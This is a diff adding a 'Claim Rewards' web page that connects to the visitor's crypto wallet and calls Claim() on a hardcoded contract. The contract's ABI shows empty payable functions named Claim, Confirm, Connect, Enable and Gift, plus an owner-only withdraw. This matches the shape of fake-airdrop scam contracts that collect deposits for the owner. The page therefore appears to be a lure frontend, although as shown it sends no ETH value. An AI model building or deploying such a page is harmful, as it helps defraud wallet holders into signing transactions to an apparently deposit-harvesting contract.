@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Claim Rewards</title>
+  <style>
+    /* Add your custom styles here */
+  </style>
+</head>
+<body>
+  <h1>Claim Rewards</h1>
+  <button id="claimButton">Claim</button>
+
+  <script src="web3.min.js"></script>
+  <script>
+  // Wait for the page to load
+window.addEventListener('load', async () => {
+  // Check if Web3 is available
+  if (typeof web3 !== 'undefined') {
+    // Use the existing Web3 provider
+    window.web3 = new Web3(web3.currentProvider);
+  } else {
+    // Handle the case where the user doesn't have Web3 installed or enabled
+    console.error('Please install MetaMask or another Web3 provider.');
+    return;
+  }
+
+  // Load the contract
+  const contractAddress = '0xcB153471E78c062519e43e9AE70d6CcA31989C10'; // Replace with the actual contract address
+  const contractABI = [
+  {
+    "inputs": [],
+    "stateMutability": "nonpayable",
+    "type": "constructor"
+  },
+  {
+    "anonymous": false,
+    "inputs": [
+      {
+        "indexed": true,
+        "internalType": "address",
+        "name": "previousOwner",
+        "type": "address"
+      },
+      {
+        "indexed": true,
+        "internalType": "address",
+        "name": "newOwner",
+        "type": "address"
+      }
+    ],
+    "name": "OwnershipTransferred",
+    "type": "event"
+  },
+  {
+    "inputs": [],
+    "name": "Claim",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "Confirm",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "Connect",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "Enable",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "Gift",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      {
+        "internalType": "uint256",
+        "name": "amount",
+        "type": "uint256"
+      },
+      {
+        "internalType": "address",
+        "name": "recipient",
+        "type": "address"
+      }
+    ],
+    "name": "withdraw",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "getBalance",
+    "outputs": [
+      {
+        "internalType": "uint256",
+        "name": "",
+        "type": "uint256"
+      }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      {
+        "internalType": "address",
+        "name": "newOwner",
+        "type": "address"
+      }
+    ],
+    "name": "transferOwnership",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "renounceOwnership",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "stateMutability": "payable",
+    "type": "receive"
+  }
+];
+
+  const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+  // Get the user's accounts
+  const accounts = await web3.eth.getAccounts();
+  const userAccount = accounts[0];
+
+  // Handle the claim button click event
+  const claimButton = document.getElementById('claimButton');
+  claimButton.addEventListener('click', async () => {
+    try {
+      // Call the contract's claim function
+      await contract.methods.Claim().send({ from: userAccount });
+      console.log('Claim successful');
+      // You can add additional code here to handle the claim success event
+    } catch (error) {
+      console.error('Claim failed', error);
+      // You can add additional code here to handle the claim failure event
+    }
+  });
+});
+</script>
+</body>
+</html>
